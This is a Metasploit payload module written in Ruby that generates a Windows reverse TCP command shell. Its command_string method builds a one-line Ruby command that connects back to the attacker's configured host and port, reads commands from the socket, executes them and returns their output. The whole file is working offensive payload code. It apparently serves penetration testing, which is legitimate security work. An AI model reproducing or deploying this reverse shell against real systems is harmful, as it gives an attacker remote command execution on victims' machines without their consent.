##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Command Shell, Reverse TCP (via Ruby)',
      'Description' => 'Connect back and create a command shell via Ruby',
      'Author'      => 'kris katterjohn',
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_CMD,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'ruby',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    return super + command_string
  end

  def command_string
    "ruby -rsocket -e \"c=TCPSocket.new(\\\"#{datastore['LHOST']}\\\",\\\"#{datastore['LPORT']}\\\");while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end\""
  end
end
